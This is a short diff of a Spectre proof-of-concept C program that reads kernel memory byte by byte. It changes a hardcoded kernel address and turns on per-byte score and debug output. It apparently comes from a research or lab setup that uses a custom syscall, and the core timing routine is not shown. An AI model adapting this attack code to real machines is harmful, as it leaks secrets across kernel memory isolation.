@@ -107,7 +107,7 @@ int main(int argc, const char **argv) {
         perror("mmap operation failed");
         return -1;
     }
-    size_t array2_kva = 0xffff880042800000; // get from kernel output: `sudo cat /prob/kmsg | grep Spectre`
+    size_t array2_kva = 0xffff88003ed00000; // get from kernel output: `sudo cat /prob/kmsg | grep Spectre`
 
     // Spectre attack
     array1_kva = syscall(330, 1);
@@ -127,21 +127,21 @@ int main(int argc, const char **argv) {
     double datalen = len;
     time1 = clock();
     while (--len >= 0) {
-        //printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
         do {
                 readMemoryByte(malicious_x, value, score, array2_offset);
             } while (value[0] <= 31 || value[0] >= 127);
         malicious_x++;
-        //printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-        printf("%c", value[0]);
-        //printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-        //if (score[1] > 0)
-        //    printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-	//printf("\n");
+        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+        //printf("%c", value[0]);
+        printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+        if (score[1] > 0)
+            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+	printf("\n");
     }
     time2 = clock() - time1;
     double totaltime = (double)time2 / CLOCKS_PER_SEC * 1000;
-    printf("\ntotal time = %fms bandwidth = %f kbps\n", totaltime, datalen * 8 / totaltime);
+    printf("total time = %fms bandwidth = %f kbps\n", totaltime, datalen * 8 / totaltime);
     
     return(0);
 }
